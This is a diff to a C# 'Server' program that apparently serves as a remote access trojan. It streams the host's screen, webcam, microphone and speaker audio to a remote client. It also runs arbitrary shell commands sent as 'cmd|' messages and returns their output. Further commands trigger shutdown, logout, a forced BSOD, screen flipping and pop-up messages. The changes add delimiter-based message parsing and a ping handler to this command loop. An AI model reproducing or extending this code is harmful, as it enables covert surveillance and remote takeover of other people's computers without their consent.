@@ -200,7 +200,6 @@ namespace Server
                 while (true)
                 {
                     TcpClient client = await listener.AcceptTcpClientAsync().ConfigureAwait(false);
-                    Console.WriteLine("Client connected.");
 
                     //_ = handleClient(client);
                     _ = Task.Run(() => handleClient(client));
@@ -330,6 +329,8 @@ namespace Server
             {
                 using (NetworkStream stream = client.GetStream())
                 {
+                    Console.WriteLine("Screen client connected.");
+
                     Task sendingTask = SendScreenSharingFramesAsync(stream);
 
                     await Task.WhenAll(sendingTask);
@@ -352,6 +353,9 @@ namespace Server
             {
                 using (NetworkStream stream = client.GetStream())
                 {
+                    Console.WriteLine("Voice client connected.");
+
+
                     var waveIn = new WaveInEvent();
                     waveIn.WaveFormat = new WaveFormat(44100, 1);
 
@@ -390,6 +394,9 @@ namespace Server
             {
                 using (NetworkStream stream = client.GetStream())
                 {
+                    Console.WriteLine("Speaker client connected.");
+
+
                     var waveIn = new WasapiLoopbackCapture();
                     waveIn.WaveFormat = new WaveFormat(44100, 1);
 
@@ -427,226 +434,264 @@ namespace Server
             try
             {
                 byte[] buffer = new byte[1024];
+                StringBuilder sb = new StringBuilder();
+
                 while (true)
                 {
                     int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
                     if (bytesRead > 0)
                     {
-                        string receivedData = Encoding.UTF8.GetString(buffer, 0, bytesRead);
 
-                        
-                        if (receivedData.StartsWith("fps"))
+                        string chunk = Encoding.UTF8.GetString(buffer, 0, bytesRead);
+                        if (string.IsNullOrWhiteSpace(chunk))
+                            continue; 
+
+                        sb.Append(chunk);
+                        string data = sb.ToString();
+
+                        if (data.Trim('*').Length == 0)
+                            continue;
+
+                        string[] messages = data.Split('*');
+
+                        sb.Clear();
+                        if (!data.EndsWith("*"))
                         {
-                            string numberString = receivedData.Substring(3);
-
-                            if (int.TryParse(numberString, out int number))
-                            {
-                                fps = number;
-                            }
+                            sb.Append(messages[messages.Length - 1]);
+                            Array.Resize(ref messages, messages.Length - 1);
                         }
 
-                        if (receivedData.StartsWith("compression"))
+                        foreach (string msg in messages)
                         {
-                            string numberString = receivedData.Substring(11);
+                            string receivedData = msg.Trim();
+                            if (string.IsNullOrEmpty(receivedData))
+                                continue;
 
-                            if (int.TryParse(numberString, out int number))
+                            try
                             {
-                                compression = number;
-                            }
-                        }
 
-                        if (receivedData.StartsWith("msg"))
-                        {
-                            string[] parts = receivedData.Substring(3).Split('|');
-
-                            if (parts.Length < 2)
-                            {
-                                Console.WriteLine("Invalid format for messagebox. Use: text|title|buttons|icon");
-                                Console.WriteLine("Received data from client: " + receivedData);
-                                return;
-                            }
-
-                            string text = parts[0];
-                            string title = parts[1];
-                            MessageBoxButtons buttons = MessageBoxButtons.OK;
-                            MessageBoxIcon icon = MessageBoxIcon.None;
-
-                            if (parts.Length > 2 && Enum.TryParse(parts[2], out MessageBoxButtons parsedButtons))
-                            {
-                                buttons = parsedButtons;
-                            }
-                            if (parts.Length > 3 && Enum.TryParse(parts[3], out MessageBoxIcon parsedIcon))
-                            {
-                                icon = parsedIcon;
-                            }
-
-                            MessageBox.Show(text, title, buttons, icon);
-                        }
-
-                        if(receivedData.StartsWith("openweb")) 
-                        {
-                            string url = receivedData.Substring(7);
-                            Process.Start(url);
-                        }
-
-
-                        if (receivedData.StartsWith("engtts"))
-                        {
-                            string[] parts = receivedData.Substring(6).Split('|');
-
-                            if (parts.Length < 2)
-                            {
-                                Console.WriteLine("Invalid format for TTS. Use: text|speed");
-                                Console.WriteLine("Received data from client: " + receivedData);
-                                return;
-                            }
-
-                            string text = parts[0];
-                            int speed = Convert.ToInt32(parts[1]);
-
-                            PlayTTSeng(text, speed);
-                        }
-
-                        if (receivedData.StartsWith("tts"))
-                        {
-                            string[] parts = receivedData.Substring(3).Split('|');
-
-                            if (parts.Length < 3)
-                            {
-                                Console.WriteLine("Invalid format for TTS. Use: text|speaker|speed");
-                                Console.WriteLine("Received data from client: " + receivedData);
-                                return;
-                            }
-
-                            string text = parts[0];
-                            string speaker = parts[1];
-                            float speed = float.Parse(parts[2], System.Globalization.CultureInfo.InvariantCulture);
-
-                            await PlayTTS(text, (Speakers)Enum.Parse(typeof(Speakers), speaker), speed);  
-                        }
-
-                        if (receivedData.StartsWith("resolution"))
-                        {
-                            string[] parts = receivedData.Substring(10).Split('|');
-
-                            if (parts.Length < 2)
-                            {
-                                Console.WriteLine("Invalid format for resolution. Use: width|height");
-                                Console.WriteLine("Received data from client: " + receivedData);
-                                return;
-                            }
-
-                            size.Width = Convert.ToInt32(parts[0]);
-                            size.Height = Convert.ToInt32(parts[1]);
-                        }
-
-                        if (receivedData.StartsWith("cmd|"))
-                        {
-                            string result = await ExecuteCmdAsync(receivedData.Substring(4));
-                            Console.WriteLine($"{result}");
-                            string output = "cmd|" + result;
-
-                            byte[] bytes = Encoding.UTF8.GetBytes(output);
-                            await stream.WriteAsync(bytes, 0, bytes.Length);
-                        }
-
-
-
-                        switch (receivedData)
-                        {
-                            case "pauseCam":
-                                videoSource.Stop();
-                                break;
-                            case "resumeCam":
-                                videoSource.Start();
-                                break;
-
-                            case "info":
-                                byte[] responseBytesInfo = Encoding.UTF8.GetBytes("info" + systemInfo);
-                                await stream.WriteAsync(responseBytesInfo, 0, responseBytesInfo.Length);
-                                break;
-
-                            case "pauseScreen":
-                                isScreenSharingPaused = true;
-                                break;
-                                
-
-                            case "resumeScreen":
-                                isScreenSharingPaused = false;
-                                break;
-
-                            case "micOn":
-                                isMicAudio = true;
-                                break;
-
-                            case "micOff":
-                                isMicAudio = false;
-                                break;
-
-                            case "speakerOn":
-                                isSystemAudio = true;
-                                break;
-
-                            case "speakerOff":
-                                isSystemAudio = false;
-                                break;
-
-                            case "shutdown":
-                                Shutdown();
-                                break;
-
-                            case "restart":
-                                Restart();
-                                break
-                                    ;
-                            case "sleep":
-                                Sleep();
-                                break;
-
-                            case "logout":
-                                Logout();
-                                break;
-
-                            case "togglecd":
-                                CDTray();
-                                break;
-
-                            case "bsod":
-                                BSOD();
-                                break;
-
-                            case "flipScr":
-                                int screenWidth = Screen.PrimaryScreen.Bounds.Width;
-                                int screenHeight = Screen.PrimaryScreen.Bounds.Height;
-
-                                StretchBlt(screenDC, 0, 0, screenWidth, screenHeight,
-                                    screenDC, 0, screenHeight, screenWidth, -screenHeight, 0x00CC0020);
-                                break;
-
-                            case "invertScr":
-                                int x = Screen.PrimaryScreen.Bounds.Width;
-                                int y = Screen.PrimaryScreen.Bounds.Height;
-                                StretchBlt(screenDC, 0, 0, x, y, screenDC, 0, 0, x, y, 0x00330008);
-                                break;
-
-
-                            case "restartServer":
-
-                                ProcessStartInfo startInfo = new ProcessStartInfo(Application.ExecutablePath)
+                                if (receivedData.StartsWith("fps"))
                                 {
-                                    UseShellExecute = true
-                                };
+                                    string numberString = receivedData.Substring(3);
 
-                                Process.Start(startInfo);
-                                Environment.Exit(0);
+                                    if (int.TryParse(numberString, out int number))
+                                    {
+                                        fps = number;
+                                    }
+                                }
 
-                                break;
+                                if (receivedData.StartsWith("compression"))
+                                {
+                                    string numberString = receivedData.Substring(11);
+
+                                    if (int.TryParse(numberString, out int number))
+                                    {
+                                        compression = number;
+                                    }
+                                }
+
+                                if (receivedData.StartsWith("msg"))
+                                {
+                                    string[] parts = receivedData.Substring(3).Split('|');
+
+                                    if (parts.Length < 2)
+                                    {
+                                        Console.WriteLine("Invalid format for messagebox. Use: text|title|buttons|icon");
+                                        Console.WriteLine("Received data from client: " + receivedData);
+                                        return;
+                                    }
+
+                                    string text = parts[0];
+                                    string title = parts[1];
+                                    MessageBoxButtons buttons = MessageBoxButtons.OK;
+                                    MessageBoxIcon icon = MessageBoxIcon.None;
+
+                                    if (parts.Length > 2 && Enum.TryParse(parts[2], out MessageBoxButtons parsedButtons))
+                                    {
+                                        buttons = parsedButtons;
+                                    }
+                                    if (parts.Length > 3 && Enum.TryParse(parts[3], out MessageBoxIcon parsedIcon))
+                                    {
+                                        icon = parsedIcon;
+                                    }
+
+                                    MessageBox.Show(text, title, buttons, icon);
+                                }
+
+                                if (receivedData.StartsWith("openweb"))
+                                {
+                                    string url = receivedData.Substring(7);
+                                    Process.Start(url);
+                                }
 
 
-                            default: break;
+                                if (receivedData.StartsWith("engtts"))
+                                {
+                                    string[] parts = receivedData.Substring(6).Split('|');
+
+                                    if (parts.Length < 2)
+                                    {
+                                        Console.WriteLine("Invalid format for TTS. Use: text|speed");
+                                        Console.WriteLine("Received data from client: " + receivedData);
+                                        return;
+                                    }
+
+                                    string text = parts[0];
+                                    int speed = Convert.ToInt32(parts[1]);
+
+                                    PlayTTSeng(text, speed);
+                                }
+
+                                if (receivedData.StartsWith("tts"))
+                                {
+                                    string[] parts = receivedData.Substring(3).Split('|');
+
+                                    if (parts.Length < 3)
+                                    {
+                                        Console.WriteLine("Invalid format for TTS. Use: text|speaker|speed");
+                                        Console.WriteLine("Received data from client: " + receivedData);
+                                        return;
+                                    }
+
+                                    string text = parts[0];
+                                    string speaker = parts[1];
+                                    float speed = float.Parse(parts[2], System.Globalization.CultureInfo.InvariantCulture);
+
+                                    await PlayTTS(text, (Speakers)Enum.Parse(typeof(Speakers), speaker), speed);
+                                }
+
+                                if (receivedData.StartsWith("resolution"))
+                                {
+                                    string[] parts = receivedData.Substring(10).Split('|');
+
+                                    if (parts.Length < 2)
+                                    {
+                                        Console.WriteLine("Invalid format for resolution. Use: width|height");
+                                        Console.WriteLine("Received data from client: " + receivedData);
+                                        return;
+                                    }
+
+                                    size.Width = Convert.ToInt32(parts[0]);
+                                    size.Height = Convert.ToInt32(parts[1]);
+                                }
+
+                                if (receivedData.StartsWith("cmd|"))
+                                {
+                                    string result = await ExecuteCmdAsync(receivedData.Substring(4));
+                                    Console.WriteLine($"{result}");
+                                    string output = "cmd|" + result;
+
+                                    byte[] bytes = Encoding.UTF8.GetBytes(output);
+                                    await stream.WriteAsync(bytes, 0, bytes.Length);
+                                }
+
+
+
+                                switch (receivedData)
+                                {
+                                    case "pauseCam":
+                                        videoSource.Stop();
+                                        break;
+                                    case "resumeCam":
+                                        videoSource.Start();
+                                        break;
+
+                                    case "info":
+                                        byte[] responseBytesInfo = Encoding.UTF8.GetBytes("info" + systemInfo);
+                                        await stream.WriteAsync(responseBytesInfo, 0, responseBytesInfo.Length);
+                                        break;
+
+                                    case "pauseScreen":
+                                        isScreenSharingPaused = true;
+                                        break;
+
+
+                                    case "resumeScreen":
+                                        isScreenSharingPaused = false;
+                                        break;
+
+                                    case "micOn":
+                                        isMicAudio = true;
+                                        break;
+
+                                    case "micOff":
+                                        isMicAudio = false;
+                                        break;
+
+                                    case "speakerOn":
+                                        isSystemAudio = true;
+                                        break;
+
+                                    case "speakerOff":
+                                        isSystemAudio = false;
+                                        break;
+
+                                    case "shutdown":
+                                        Shutdown();
+                                        break;
+
+                                    case "restart":
+                                        Restart();
+                                        break
+                                            ;
+                                    case "sleep":
+                                        Sleep();
+                                        break;
+
+                                    case "logout":
+                                        Logout();
+                                        break;
+
+                                    case "togglecd":
+                                        CDTray();
+                                        break;
+
+                                    case "bsod":
+                                        BSOD();
+                                        break;
+
+                                    case "ping":
+                                        await SendData("pong", stream);
+                                        break;
+
+                                    case "flipScr":
+                                        int screenWidth = Screen.PrimaryScreen.Bounds.Width;
+                                        int screenHeight = Screen.PrimaryScreen.Bounds.Height;
+
+                                        StretchBlt(screenDC, 0, 0, screenWidth, screenHeight,
+                                            screenDC, 0, screenHeight, screenWidth, -screenHeight, 0x00CC0020);
+                                        break;
+
+                                    case "invertScr":
+                                        int x = Screen.PrimaryScreen.Bounds.Width;
+                                        int y = Screen.PrimaryScreen.Bounds.Height;
+                                        StretchBlt(screenDC, 0, 0, x, y, screenDC, 0, 0, x, y, 0x00330008);
+                                        break;
+
+
+                                    case "restartServer":
+
+                                        ProcessStartInfo startInfo = new ProcessStartInfo(Application.ExecutablePath)
+                                        {
+                                            UseShellExecute = true
+                                        };
+
+                                        Process.Start(startInfo);
+                                        Environment.Exit(0);
+
+                                        break;
+
+
+                                    default: break;
+                                }
+
+                            }
+                            catch (Exception ex)
+                            {
+                                Console.WriteLine($"Error processing command '{receivedData}': {ex.Message}");
+                            }
+                            Console.WriteLine("Received data from client: " + receivedData);
                         }
-
-                        Console.WriteLine("Received data from client: " + receivedData);
                     }
                 }
             }
@@ -656,15 +701,13 @@ namespace Server
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"Error receiving data from client: {ex.Message}");
+                Console.WriteLine($"Error receiving data from client: {ex.Message} \n \n {ex.StackTrace}");
             }
         }
-
-        private static async Task SendData(string data, TcpClient client)
+        private static async Task SendData(string data, NetworkStream stream)
         {
             try
             {
-                NetworkStream stream = client.GetStream();
                 if (stream.CanWrite && stream != null)
                 {
                     byte[] dataBytes = Encoding.UTF8.GetBytes(data);
@@ -679,6 +722,12 @@ namespace Server
             {
                 Console.WriteLine($"Error sending data to comms client: {ex.Message}");
             }
+        }
+
+        private static async Task SendData(string data, TcpClient client)
+        {
+            NetworkStream stream = client.GetStream();
+            await SendData(data, stream);
         }
 
         private static async Task SendScreenSharingFramesAsync(NetworkStream stream)
@@ -802,6 +851,9 @@ namespace Server
         {
             try
             {
+                Console.WriteLine("Coms client connected.");
+
+
                 using (NetworkStream stream = client.GetStream())
                 { 
                     Task receivingTask = ReceiveDataFromClientAsync(stream);
@@ -1336,4 +1388,8 @@ namespace Server
         public string IsVirtualizationEnabled { get; set; }
     }
 
+    public static class Logger
+    {
+
+    }
 }
